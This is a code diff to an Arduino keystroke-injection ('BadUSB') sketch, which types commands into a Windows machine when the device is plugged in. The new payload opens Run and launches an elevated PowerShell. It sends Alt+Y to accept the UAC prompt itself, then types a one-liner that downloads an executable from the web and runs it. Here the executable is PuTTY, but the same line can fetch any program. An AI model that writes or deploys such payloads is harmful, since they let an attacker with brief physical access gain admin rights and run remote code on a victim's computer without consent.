@@ -9,13 +9,6 @@ int ClickCount = 0;             // Counter for button press
 int buttonState = HIGH;         // 
 boolean RunPayload = true;      // Determine wheter to run the payload; default=true (first plugin)
 
-void typeKey(uint8_t key)
-{
-  Keyboard.press(key);
-  delay(50);
-  Keyboard.release(key);
-}
-
 void BlinkLEDs(int BlinkCount) //Blink RX/TX LEDs
 {
   for(int i=0; i < BlinkCount; i++){
@@ -28,25 +21,42 @@ void BlinkLEDs(int BlinkCount) //Blink RX/TX LEDs
   }
 }
 
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+
 void SendPayload()
 {
-  // This is the function that include all the key typing payload
-  Keyboard.begin();     // Begining the Keyboard stream
-  delay(500);
-  typeKey(KEY_LEFT_GUI);
-  delay(500);
-  Keyboard.print("cmd");
-  delay(500);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
+   // Begining the Keyboard stream
+  Keyboard.begin();
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(500);
-  typeKey(KEY_LEFT_ARROW);
-  typeKey(KEY_RETURN);
-  Keyboard.end();      // Ending stream  
+  delay(200);
 
+  // my best attempt at a elevated powershell instance
+  Keyboard.print("powershell Start-Process powershell -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(4000);
+  // download and run Putty
+  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; $file = 'putty.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+
+  typeKey(KEY_RETURN);
+  // Ending stream
+  Keyboard.end();
 }
+
 
 /* Init function */
 void setup()
@@ -80,5 +90,4 @@ void loop() {
     BlinkLEDs(3);       // Blink RX/TX LEDs to indicate send payload done 
   }
   delay(500);
-  
 }
